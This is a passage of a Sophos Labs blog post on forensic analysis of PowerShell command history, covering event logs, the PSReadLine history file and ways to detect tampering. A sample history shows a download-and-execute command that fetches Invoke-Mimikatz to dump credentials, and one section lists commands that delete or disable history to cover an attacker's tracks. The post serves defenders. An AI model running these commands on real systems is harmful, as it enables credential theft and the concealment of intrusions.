<p style="font-weight:400;">The field &lsquo;HostApplication&rsquo; might display the encoded bits used such as:</p>
<p style="font-weight:400;">HostApplication=powershell.exe -EncodedCommand&nbsp;VwByAGkAdABlAC0ASABvAHMAdAAgAC0ATwBiAGoAZQBjAHQAIAAiAEgAZQBsAGwAbwAsACAAdwBvAHIAbA BkACEAIgA7AA==</p>
<ul>
<li style="font-weight:400;">Event ID 600: indicates that providers such as&nbsp;WSMan&nbsp;start to perform a PowerShell activity on the system, for example, &ldquo;Provider&nbsp;WSMan&nbsp;Is Started&rdquo;.</li>
<li style="font-weight:400;">Event ID 403: The engine status is changed from Available to Stopped. This event records the completion of a PowerShell activity.</li>
</ul>
<ol start="3">
<li style="font-weight:400;">Microsoft-Windows-PowerShell/Operational.evtx</li>
</ol>
<p style="font-weight:400;padding-left:30px;">NOTE: This is not applicable for PowerShell 2.0</p>
<ul>
<li style="font-weight:400;">Event ID 4103: Module Logging is disabled by default. If enabled, it will record portions of scripts, some de-obfuscated code, and some data formatted for output.</li>
<li style="font-weight:400;">Event ID 4104: Script Block Logging is enabled by default. It records blocks of code as they are executed by the PowerShell engine, thereby capturing the full contents of code executed by an attacker, including scripts and commands.</li>
</ul>
<p><a href="/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/3.png"><img src="/resized-image/__size/640x480/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/3.png" alt=" " /></a></p>
<p style="font-weight:400;">There&rsquo;s a fourth place where we can potentially look from a forensics&rsquo; perspective. If commands are carried out on a PowerShell console, a session history i.e. list of commands entered during the current session is saved. On PowerShell versions &lt; 5, a session specific history can be identified using the Get-History command. The list is lost if the session is closed.</p>
<h2><a id="Get-History"></a>Get-History</h2>
<p style="font-weight:400;">The Get-History cmdlet gets the session history, that is, the list of commands entered during the current session. Beginning in Windows PowerShell 3.0, the default value is&nbsp;<strong>4096</strong>.</p>
<p style="font-weight:400;">PS C:\WINDOWS\system32&gt;&nbsp;<strong>Get-History</strong></p>
<p style="font-weight:400;">&nbsp;&nbsp;Id&nbsp;CommandLine</p>
<p style="font-weight:400;">&nbsp;&nbsp;-- -----------</p>
<p style="font-weight:400;">&nbsp;&nbsp;&nbsp;1 (Get-PSReadlineOption).HistorySavePath</p>
<p style="font-weight:400;">&nbsp;&nbsp;&nbsp;2 ping localhost</p>
<p style="font-weight:400;">&nbsp;&nbsp;&nbsp;3 Test-Path ((Get-PSReadlineOption).HistorySavePath)</p>
<p style="font-weight:400;">&nbsp;&nbsp;&nbsp;4 Get-History</p>
<p style="font-weight:400;">&nbsp;&nbsp;&nbsp;5 powershell.exe -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;</p>
<p style="font-weight:400;">&nbsp;&nbsp;&nbsp;6&nbsp;whoami</p>
<h2><a id="Console History File"></a>Console History File</h2>
<p style="font-weight:400;">The&nbsp;PSReadline&nbsp;module is installed and enabled by default starting from PowerShell v5 on Windows 10 onward. It is responsible for recording what is typed into the console. The default option is to save history to a file.</p>
<p style="font-weight:400;"><strong>NOTE</strong>: PSReadLine is not included in the separately installed PowerShell 5 for previous versions of Windows. Thus, if you want to use the PowerShell command history functionality you will need to install the PSReadLine module separately.</p>
<p style="font-weight:400;">The default location of this file:</p>
<p style="font-weight:400;">$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</p>
<p style="font-weight:400;">PSReadLine requires PowerShell 3.0, or newer, and the console host. It does&nbsp;<u>not</u>&nbsp;work in PowerShell ISE.</p>
<p style="font-weight:400;">A sample output:</p>
<p style="font-weight:400;"><a href="/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/4.png"><img src="/resized-image/__size/640x480/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/4.png" alt=" " /></a></p>
<h1><a id="Adversarial Tactics"></a>Adversarial Tactics</h1>
<p style="font-weight:400;">Attackers have been seen to delete forensic artifacts in the form of Windows Event Logs to cover their tracks. They may also clear the command history of a compromised account to conceal the commands executed during/after a successful intrusion. We&rsquo;ll discuss some of the possible tactics in detail.</p>
<h2><a id="Clear-History"></a>Clear-History</h2>
<p style="font-weight:400;">By default, Clear-History deletes the entire command history from a PowerShell session but it does not delete/flush the PSReadLine command history file on the disk. This tactic would be useful for attackers on PowerShell versions &lt;5 on Windows 7 / 8.1 / Windows Server 2008 / R2 / 2012R2 as there is no physical file containing the command history.</p>
<h2><a id="Backup/Restore History"></a>Backup/Restore History</h2>
<p style="font-weight:400;">Backup the existing file with a view to restore it after. e.g.</p>
<p style="font-weight:400;">rename-item -path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -newname ConsoleHost_history_before.txt</p>
<p style="font-weight:400;">If they use PowerShell to perform this activity will result in this action to be logged.</p>
<h2><a id="Delete History File"></a>Delete History File</h2>
<p style="font-weight:400;">The adversary could delete the history file from the PowerShell prompt at the end of a session:</p>
<p style="font-weight:400;">remove-item -force -path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</p>
<h2><a id="Change PSReadline Configuration"></a>Change&nbsp;PSReadline&nbsp;Configuration</h2>
<p style="font-weight:400;">An adversary may change the default behaviour of the&nbsp;PSReadline&nbsp;configuration and prevent the history of commands being recorded.</p>
<p style="font-weight:400;">Set-PSReadlineOption&nbsp;-HistorySaveStyle&nbsp;SaveNothing</p>
<p style="font-weight:400;">They could possibly re-enable it afterwards,</p>
<p style="font-weight:400;">Set-PSReadlineOption&nbsp;-HistorySaveStyle&nbsp;SaveIncrementally</p>
<p style="font-weight:400;">The act of changing the style of event history from a PS prompt would be logged.&nbsp;&nbsp;The presence of these commands in the history would be a red flag. It may sound like an over-kill but for the sake of completeness, it&rsquo;s worthy of a mention.</p>
<h1><a id="Investigation Tips"></a>Investigation Tips</h1>
<p style="font-weight:400;">If you happen to stumble upon a rich ConsoleHost_history.txt like the one below, you&rsquo;re in luck.</p>
<p style="font-weight:400;"><a href="/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/5.png"><img src="/resized-image/__size/640x480/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/5.png" alt=" " /></a></p>
<p style="font-weight:400;">If the last command(s) executed are surprisingly less or include:</p>
<p style="font-weight:400;">Set-PSReadlineOption&nbsp;-HistorySaveStyle&nbsp;SaveIncrementally</p>
<p style="font-weight:400;">or</p>
<p style="font-weight:400;">$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -newname ConsoleHost_history_before.txt</p>
<p style="font-weight:400;">or</p>
<p style="font-weight:400;">Clear-History</p>
<p style="font-weight:400;">or</p>
<p style="font-weight:400;">ConsoleHost_history.txt&nbsp;is not present on a machine.</p>
<p style="font-weight:400;">It could mean that the history or the file it-self has been tampered with.</p>
<p style="font-weight:400;">These Indicator of Compromise [IOCs] could help us identify what might have happened:</p>
<ol>
<li style="font-weight:400;">If the file was tampered with, we would like to identify if a non-PowerShell process such as Command Prompt or Windows Explorer was used to modify/delete the history file.</li>
<li style="font-weight:400;">The &ldquo;Creation Time&rdquo; of&nbsp;ConsoleHost_history.txt&nbsp;is fairly recent. This could indicate that the attacker deleted the previous file and it has been automatically generated when PowerShell was executed again.</li>
<li style="font-weight:400;">If we recorded any process related detail which had the following command-line:</li>
</ol>
<ul>
<li style="font-weight:400;">-HistorySaveStyle&nbsp;SaveNothin</li>
</ul>
<p style="font-weight:400;">The following Live Discover Query could be used prior to the investigation of the actual&nbsp;ConsoleHost_history.txt&nbsp;file if you suspect any modification/deletion:</p>
<p style="font-weight:400;">select CAST( datetime(sfj.time,&#39;unixepoch&#39;) AS TEXT) DATE_TIME,<br />sfj.subject,<br />CAST( datetime(sfj.creationtime,&#39;unixepoch&#39;) AS TEXT) CREATION_DATE_TIME,<br />sfj.pathname,<br />spj.cmdline,<br />spj.sid<br />from&nbsp;sophos_file_journal&nbsp;sfj&nbsp;join&nbsp;sophos_process_journal&nbsp;spj&nbsp;on&nbsp;spj.sophosPID&nbsp;=&nbsp;sfj.sophosPID<br />where&nbsp;sfj.pathname&nbsp;like &#39;%ConsoleHost_history.txt&#39; and&nbsp;spj.cmdline&nbsp;not like &#39;%powershell%&#39;;</p>
<p style="font-weight:400;">If the file has been deleted by Explorer.exe, the output should be similar to:</p>
<p style="font-weight:400;"><a href="/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/6.png"><img src="/resized-image/__size/640x480/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/6.png" alt=" " /></a></p>
</div>
</div>
</div><div style="clear:both;"></div></div>
				</div>
		</div>
<div class="content-fragment-footer"></div>
</div>
<div class="content-fragment threaded-comments no-wrapper with-spacing responsive-3" id="fragment-3081" data-reflow="_p_content,_p_singlecolumn,3,1,10">
<div class="content-fragment-content">







	







<div id="fragment-3081_statisticsWrapper" class="comment-statistics"></div>




<div class="threaded-wrapper-outer">
	<div class="typing-status-wrapper root"></div>
	<div class="threaded-wrapper" id="fragment-3081_preRenderedWrapperId">
		



			




	
	











<div class="pager ui-page" data-currentpage="0" data-pagesize="5" data-totalitems="0" data-pagekey="pifragment-3081" data-configuration="" ></div>

	
	</div>
</div>

<div id="fragment-3081_editorWrapperWrapper" style="display:none">
		
	
	
	
	
	
	<textarea id="fragment-3081_fragment-3081_replyEditor" style="width:100%, height:60px"></textarea>
<script type="text/javascript">
jQuery(function() { jQuery('#fragment-3081_fragment-3081_replyEditor').evolutionHtmlEditor({ width: '100%', height: '60px', submittable: true,contentTypeId:'9262536b-49a3-4494-802f-04dff10424ed',enterToSubmitPrompt:'Enter to Reply',submitLabel:'Reply',beforeSubmitHtml:'',afterSubmitHtml:'',placeholder:'',autoResize:true,enableEnterToSubmitToggle:true}).on('evolutionHtmlEditorSubmit', function(e) { (function() { jQuery.telligent.evolution.messaging.publish('widgets.threadedComments.submit') })(e.html); }); });</script>
</div>



</div>
<div class="content-fragment-footer"></div>
</div>
</div>
</div>
</div>
<div class="layout-footer"></div>
</div></div>
<div class="single-column footer-fragments evolution-reflow-container" data-related="_f_page" id="_f_singlecolumn" style = "display:none"></div><div class="footer-fragments evolution-reflow-container" data-related="_f_singlecolumn" id="_f_page"  data-reflow-width="670"><div class="layout">
<div class="layout-header"></div>
<div class="layout-content content" id="_f_layout"><div class="layout-region content" id="_f_content">
<div class="layout-region-inner content"><div class="content-fragment scripted-content-fragment no-wrapper with-spacing" id="footer-1489" data-reflow="_f_content,_f_singlecolumn,10000,1,0">
<div class="content-fragment-content">
<script type="text/javascript" src="https://community.sophos.com/cfs-filesystemfile/__key/widgetfiles/77a16f73f306488cad3694943666f104-d/cookiebanner.js?_=637355231399563975"></script>
<link rel="stylesheet" type="text/css" href="https://community.sophos.com/cfs-filesystemfile/__key/widgetfiles/77a16f73f306488cad3694943666f104-d/cookiebanner.css?_=637355231399456557" />

<script>
window.addEventListener("load", function(){
window.cookieconsent.initialise({
  "palette": {
    "popup": {
      "background": "#2196F3",
      "text": "#FFF"
    },
    "button": {
      "background": "#FFF",
      "text": "#2196F3"
    }
  },
  "position": "bottom",
  "content": {
    "message": "This website uses cookies to make your browsing experience better.  By using our site you agree to our use of cookies.",
    "dismiss": "Accept",
    "link": "Learn More!",
    "href": "https://www.sophos.com/en-us/legal/cookie-information.aspx"
  }
})});
</script></div>
<div class="content-fragment-footer"></div>
</div>
<div class="content-fragment user-hover no-wrapper with-spacing responsive-1" id="footer-638" data-reflow="_f_content,_f_singlecolumn,1,1,1">
<div class="content-fragment-content">
<!-- Return to Top -->
<a href="javascript:" id="return-to-top" style="display: none;"><i class="icon-chevron-up"></i></a>

<script type="text/javascript">
// ===== Scroll to Top ==== 
$(window).scroll(function() {
    if ($(this).scrollTop() >= 50) {        // If page is scrolled more than 50px
        $('#return-to-top').fadeIn(200);    // Fade in the arrow
    } else {
        $('#return-to-top').fadeOut(200);   // Else fade out the arrow
    }
});
$('#return-to-top').click(function() {      // When arrow is clicked
    $('body,html').animate({
        scrollTop : 0                       // Scroll to top of body
    }, 500);
});

</script>

			</div>
<div class="content-fragment-footer"></div>
</div>
<div id="footer-1507"></div>
<div id="footer-1508"></div>
<div class="content-fragment raw-content top-border with-spacing with-header responsive-1" id="footer-1402" data-reflow="_f_content,_f_singlecolumn,1,1,4">
<div class="content-fragment-header">
Unfiltered HTML
	</div>
<div class="content-fragment-content">


	<div id="footer-1402_content" class=" user-defined-markup" style="">
		  
<footer>
<!-- Logo and legal -->
<div id="legal">
  <div class="container clear">
            <ul>
            <li>
                <a href="https://community.sophos.com/w/getting-started">Getting started</a>
            </li>   
            <li>
                <a href="https://www.sophos.com/en-us/legal.aspx">Legal</a>
            </li>
            <li>
                <a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-notice.aspx">Privacy</a>
            </li>
            <li>
                <a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookies</a>
            </li>   
            </ul>
        
    <div id="footer-logo">
      <a href="https://www.sophos.com/en-us.aspx"><div class="footer-logo"></div></a>
    </div>
    <p>
      © 1997 - 2021 Sophos Ltd. All rights reserved.
    </p>

  </div>
</div>
</footer>
<div style="clear:both;"></div>
	</div>
</div>
<div class="content-fragment-footer"></div>
</div>
</div>
</div>
</div>
<div class="layout-footer"></div>
</div></div>
			<script type="text/javascript" src="https://community.sophos.com/cfs-filesystemfile/__key/widgetfiles/c9932b3229d8453892c87cef53db657e-d/ui.js?_=637571140158595780"></script>

        <script src="https://static.cloud.coveo.com/searchui/v1.2537/js/CoveoJsSearch.Searchbox.min.js"></script>
        <script>
          document.addEventListener("DOMContentLoaded", function() {
            Coveo.SearchEndpoint.endpoints["default"] = new Coveo.SearchEndpoint({
              restUri: "https://platform.cloud.coveo.com/rest/search",
              accessToken: 'xx18faf283-8a38-4d2b-bb36-be586a009a78'
            });
            var root = Coveo.$$(document).find("#searchbox");
            Coveo.initSearchbox(root, "https://techvids.sophos.com/search");
            Coveo.$$(root).on(
              Coveo.StandaloneSearchInterfaceEvents.beforeRedirect,
              function(e, data) {
                data.searchPageUri += "#t=Support";
              }
            );
          });
        </script>
    
	<script type="text/html" id="header-1665_site-banner-list-template">
		<div>
			<div class="multiple-column-list columns-1">
				<div class="multiple-column-item column-1">
					<ul class="content-list content">
					</ul>
					<div class="loading"><span class="ui-loading"></span></div>
					<% if(footerContent) { %>
						<div class="content-list-footer">
							<%= footerContent %>
						</div>
					<% } %>
				</div>
			</div>
		</div>
	</script>

			<script type="text/html" id="header-1665_site-banner-notification-preferences-template">
			<div class="notification-preference">
				<span class="description">Do not notify me when someone <strong><%: notificationTypeName %></strong>?</span>
				<a href="#" class="confirm internal-link button submit-button" data-notificationtypeid="<%: notificationTypeId %>">Confirm</a>
				<a href="#" class="cancel internal-link button submit-button">Cancel</a>
			</div>
		</script>

		<script type="text/html" id="header-1665_site-banner-bookmark-filter-template">

			<ul class="navigation-list filter">
				<% if(contentTypeIds && contentTypeIds.length > 0) { %>
					<li class="navigation-item conversations">
						<a class="internal-link" href="#" data-contenttypeids="<%: contentTypeIds %>">Content</a>
					</li>
				<% } %>
				<% if(applicationContentTypeIds && applicationContentTypeIds.length > 0) { %>
					<li class="navigation-item conversations">
						<a class="internal-link" href="#" data-contenttypeids="<%: applicationContentTypeIds %>">Application</a>
					</li>
				<% } %>
				<% if(containerTypes && containerTypes.length > 0) { %>
					<% foreach(containerTypes, function(containerType) {  %>
						<li class="navigation-item conversations">
							<a class="internal-link" href="#" data-contenttypeids="<%: containerType.id %>"><%: containerType.name %></a>
						</li>
					<% }); %>
				<% } %>
			</ul>
		</script>

		<script type="text/html" id="header-1665_site-banner-user-template">
									<div class="user "
								<div>
					<div class="avatar">
													<img src="https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/system-images/anonymous.gif_2D00_40x40x2.png?_=637355151916479708" alt="Anonymous" />
											</div>
					<span class="user-name">
													Anonymous
											</span>

														</div>
			</div>

										<ul class="navigation-list user">
																																																																																																																											</ul>
					</script>
				<script type="text/html" id="header-1665_site-banner-search-filter-template">
			<% if(places && places.length > 0) { %>
				<ul class="navigation-list filter">
					<% foreach(places, function(place) { %>
						<li class="navigation-item">
							<a class="place internal-link" href="#" data-key="<%: place.key %>" data-value="<%: place.value %>" data-searchparam="<%: place.searchParameter %>" data-searchvalue="<%: place.searchValue %>"><%= place.name %></a>
					<% }); %>
				</ul>
			<% } %>
			<% if(filters && filters.length > 1) { %>
				<ul class="navigation-list filter">
				<% foreach(filters, function(filter) {  %>
					<li class="navigation-item">
						<a class="type internal-link" href="#" data-key="<%: filter.key %>"><%= filter.name %></a>
					</li>
				<% }); %>
				</ul>
			<% } %>
		</script>
		
	
	<script type="text/javascript">
		
		

			
															
		jQuery(function(){
			jQuery.telligent.evolution.widgets.siteBanner.register({
				wrapper: '#header-1665',
				messagePrefix: 'widget.header-1665.',
				userPopupTemplate: 'header-1665_site-banner-list-template',
				banner: jQuery('#header-1665_banner'),
									handheldSearchFieldsLink: jQuery('#header-1665_handheldSearchFieldsLink'),
					handheldSearchFields: jQuery('#header-1665_handheldSearchFields'),
					handheldBannerLinksLink: jQuery('#header-1665_handheldBannerLinksLink'),
					handheldBannerLinks: jQuery('#header-1665_handheldBannerLinks'),
					handheldBannerLinksCount: jQuery('#header-1665_handheldBannerLinksCount'),
					bannerSiteLinks: jQuery('#header-1665_bannerSiteLinks'),
					handheldSiteLinksLink: jQuery('#header-1665_handheldSiteLinksLink'),
					handheldSiteLinks: jQuery('#header-1665_handheldSiteLinks'),

											siteNavigationType: 'group',
						siteNavigationUrl: '/utility/scripted-file.ashx?_cf=groups.vm\u0026_fid=1665\u0026_wid=header-1665\u0026_ct=header\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=10\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
						siteNavigationTemplate: 'header-1665_site-banner-list-template',
						siteNavigationLink: jQuery('#header-1665_site'),
						siteNavigationTitle:  							'Groups'
						,
													siteNavigationCustomItems:
															[
																						{
									label: 'Intercept X Endpoint',
									url: 'https://community.sophos.com/intercept-x-endpoint/'
								}
															,
																						{
									label: 'Sophos (XG) Firewall',
									url: 'https://community.sophos.com/sophos-xg-firewall/'
								}
															,
																						{
									label: 'Zero Trust Network Access (EAP)',
									url: 'https://community.sophos.com/zero-trust-network-access/'
								}
															,
																						{
									label: 'UTM Firewall',
									url: 'https://community.sophos.com/utm-firewall/'
								}
															,
																						{
									label: 'Sophos Partners',
									url: 'https://community.sophos.com/sophos-partners/'
								}
															,
																						{
									label: 'Product Documentation',
									url: 'https://community.sophos.com/product-documentation/'
								}
															,
																						{
									label: 'Community Chat',
									url: 'https://community.sophos.com/community-chat/'
								}
															,
																						{
									label: 'Support Portal',
									url: 'https://community.sophos.com/support-portal/'
								}
															,
																						{
									label: 'Email Appliance',
									url: 'https://community.sophos.com/email-appliance/'
								}
															,
																						{
									label: 'Encryption',
									url: 'https://community.sophos.com/encryption/'
								}
															 
									,{
										label: 'All groups',
										url: '/g'
									}
																]
							,
																								searchFields: jQuery('#header-1665_searchFields'),
					searchTemplate: 'header-1665_site-banner-list-template',
					searchUrl: '/utility/scripted-file.ashx?_cf=searchquery.jsm\u0026_fid=1665\u0026_wid=header-1665\u0026_ct=header\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=10\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
					searchInput: jQuery('#header-1665_Search'),
					searchFooterContent: '\u003ca data-messagename=\"widget.header-1665.advancedsearch\" class=\"right\" id=\"header-1665_advancedsearch\" href=\"#\"\u003eAdvanced search\u003c/a\u003e',
					searchFilterTemplate: 'header-1665_site-banner-search-filter-template',
					searchAdvancedUrl: '/search?{0}',
					searchAdvancedUserUrl: '/members?{0}',
					searchText: 'Search',
					searchFilterContentName: 'Sophos Community',
					searchFilterGroupsName: 'Groups',
					searchFilterPeopleName: 'People',
					searchPlaceApplicationId:  'd464a5a0-b4b9-46b7-b085-e3eade1355a0' ,
					searchPlaceApplicationName:  'In Blog' ,
					searchPlaceGroupId:  '5792b545-5adb-4847-9f91-ab3c7d371bf1' ,
					searchFilterArticleName: 'In Knowledge Base',
                    searchFilterDocumentName: 'In Documentation',        
					searchPlaceGroupLocalId:  '48' ,
					searchPlaceGroupName:  'In Sophos Labs' ,
					searchPlaceAnywhereName: 'Anywhere',
					advancedSearchId: 'header-1665_advancedsearch',
					searchShowPeople:  false,
													bannerLinks: jQuery('#header-1665_bannerLinks'),

					notificationsTemplate: 'header-1665_site-banner-list-template',
					notificationsUrl: '/utility/scripted-file.ashx?_cf=notifications.vm\u0026_fid=1665\u0026_wid=header-1665\u0026_ct=header\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=10\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
					notificationsLink: jQuery('#header-1665_notifications'),
					notificationsUnread: 0,
					notificationListFooterContent: '\u003ca href=\"$core_v2_urls.Notifications()\" class=\"view-all left\"\u003eView all\u003c/a\u003e\u003ca class=\"right\" href=\"${notificationSettingsUrl}\"\u003eSettings\u003c/a\u003e',
					notificationPreferenceTemplate: 'header-1665_site-banner-notification-preferences-template',
					notificationssUnreadCountMessageSingular: 'You have {0} unread notification',
					notificationssUnreadCountMessagePlural: 'You have {0} unread notifications',

					conversationsTemplate: 'header-1665_site-banner-list-template',
					conversationsUrl: '/utility/scripted-file.ashx?_cf=conversations.vm\u0026_fid=1665\u0026_wid=header-1665\u0026_ct=header\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=10\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
					conversationsLink: jQuery('#header-1665_conversations'),
					conversationsUnread: 0,
					conversationNotificationTypeId: '84e4c0a7-3a17-4dfe-b8a0-d7038aa04a84',
					conversationListFooterContent: '\u003ca href=\"${core_v2_urls.Conversations()}\" class=\"left\"\u003eView all\u003c/a\u003e\u003ca href=\"#\" data-messagename=\"widget.header-1665.startconversation\" class=\"right\"\u003eNew message\u003c/a\u003e',
					conversationsUnreadCountMessageSingular: 'You have {0} unread message',
					conversationsUnreadCountMessagePlural: 'You have {0} unread messages',
					conversationNewConversationUrl:'/user/conversations?New=True',

					bookmarksTemplate: 'header-1665_site-banner-list-template',
					bookmarksUrl: '/utility/scripted-file.ashx?_cf=bookmarks.vm\u0026_fid=1665\u0026_wid=header-1665\u0026_ct=header\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=10\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
					bookmarksLink: jQuery('#header-1665_bookmarks'),
					bookmarksListFooterContent: '\u003ca class=\"left\" href=\"${bookmarksUrl}\"\u003eView all\u003c/a\u003e',
					bookmarksContentTypes: '$core_v2_encoding.JavascriptEncode($contentTypes)',
					bookmarksApplicationContentTypes: '$core_v2_encoding.JavascriptEncode($applicationContentTypes)',
					bookmarksContainerContentTypes: '$core_v2_encoding.JavascriptEncode($containerContentTypes)',
					bookmarksFilterTemplate: 'header-1665_site-banner-bookmark-filter-template',
					bookmarksIsBookmarked:  false ,
					bookmarksCurrentContentId: '',
					bookmarksBookmarks: 'Bookmarks',
					bookmarkAdded: 'Bookmark added',
					bookmarkRemoved: 'Bookmark removed',

					userContentTemplate: 'header-1665_site-banner-user-template',
					userLink: jQuery('#header-1665_user'),
				
				viewType: 'all'
			});
		});
	</script>

		<script>
		jQuery(function(j){
			// no sub-nav on touch
			if(j('body').hasClass('touch'))
				return;

			var container = j('#header-1128_container');
			var popup;
			var currentParent;
			var hideTimeoutHandle;

			function hideLinksPopup() {
				if(popup) {
					popup.glowPopUpPanel('hide', true);
					$(currentParent).removeClass('subnav-open');
					currentParent = null;
				}
			}

			function mouseOut() {
				window.clearTimeout(hideTimeoutHandle);
				hideTimeoutHandle = window.setTimeout(function() {
					hideLinksPopup();
				}, 300);
			}

			function mouseOver() {
				window.clearTimeout(hideTimeoutHandle);
			}

			function showLinksPopUp(parent, children) {
				parent.addClass('subnav-open');
				if(currentParent == parent.get(0)) {
					return;
				}

				var links = j('<ul></ul>').append(children);

				if(popup) {
					hideLinksPopup();
					popup.glowPopUpPanel('empty', '')
						.glowPopUpPanel('append', links)
						.glowPopUpPanel('show', parent);
				} else {
					popup = j('<div></div>')
						.glowPopUpPanel({
							cssClass: 'links-popup-panel',
							zIndex: 1500,
							hideOnDocumentClick: true
						})
						.on('glowPopUpPanelMouseOut', function() {
							mouseOut();
						})
						.on('glowPopUpPanelMouseOver', function() {
							mouseOver();
						})
						.glowPopUpPanel('append', links)
						.glowPopUpPanel('show', parent)
				}
				currentParent = parent.get(0);
			}

			container.on('mouseenter', '.navigation-list-item a', function(e){
				var elm = j(e.target);
				var children = elm.data('_link_children');
				if(!children) {
					children = elm.closest('li').find('ul.children > li');
					elm.data('_link_children', children);
				}
				if(children && children.length > 0) {
					mouseOver();
					showLinksPopUp(elm, children);
				}
			});

			container.on('mouseleave', '.navigation-list-item a', function(e){
				mouseOut();
			});
		});
		</script>
	
	<script type="text/javascript" src="https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/7bb87a0cc5864a9392ae5b9e5f9747b7-0df71baf88f84214bf4a2907d004bc2c/ui.js?_=637355151207757123"></script>
			<script type="text/html" id="telligent.evolution.widgets.moreContent.sliderTemplate">
			<div class="recommended-content-slider-content">
				<a href="#" data-messagename="telligent.evolution.widgets.more.slider.close" class="close replace-with-icon cancel-circled">Close</a>
				<% foreach(contents, function(content) { %>
					<h2><%= content.title %></h2>
					<%= content.content %>
				<% }); %>
			</div>
		</script>
	
	<script type="text/javascript">
	jQuery(function() {
		jQuery.telligent.evolution.widgets.moreContent.register({
			wrapper: '#fragment-3074',
			useSlider:  true ,
			title: 'Related',
			content: '#pifragment-3074-paged-content',
			sliderTemplate: 'telligent.evolution.widgets.moreContent.sliderTemplate',
			slideAt: 0.8,
			delayedPagedContentWrapper: 'fragment-3074_delayedPagedContentWrapper',
			delayedPagedContentUrl: "/utility/scripted-file.ashx?_cf=content.vm\u0026_fid=3074\u0026_wid=fragment-3074\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics",
			isPreview:  false		});
	});
	</script>

	<script type="text/javascript">
	jQuery(function() {
		jQuery.telligent.evolution.widgets.moreContent.register({
			wrapper: '#fragment-3075',
			useSlider:  true ,
			title: 'Recommended',
			content: '#pifragment-3075-paged-content',
			sliderTemplate: 'telligent.evolution.widgets.moreContent.sliderTemplate',
			slideAt: 0.8,
			delayedPagedContentWrapper: 'fragment-3075_delayedPagedContentWrapper',
			delayedPagedContentUrl: "/utility/scripted-file.ashx?_cf=content.vm\u0026_fid=3075\u0026_wid=fragment-3075\u0026_ct=page\u0026_cp=post\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics",
			isPreview:  false		});
	});
	</script>

<script>jQuery.telligent.evolution.template.register('fragment-3081_loadMoreTemplate',function(h,d){var s=[];with(d){with(h){s.push('	<li class=\"load-more '); if(previous) { s.push(' previous '); } else { s.push(' next '); } s.push('\" '); if (loadInline) { s.push(' data-inline=\"inline\" '); } s.push('>\r\n	'); if(previous) { s.push('\r\n		<a class=\"previous\" href=\"#\" '); if (loadInline) { s.push(' data-inline=\"inline\" '); } s.push('>View More <\/a>\r\n	'); } else { s.push('\r\n		<a class=\"next\" href=\"#\" '); if (loadInline) { s.push(' data-inline=\"inline\" '); } s.push('>View More <\/a>\r\n	'); } s.push('\r\n	<span class=\"ui-loading\" data-width=\"24\" data-height=\"24\"><\/span>\r\n<\/li>\r\n\r\n');}}return s.join('');});</script>
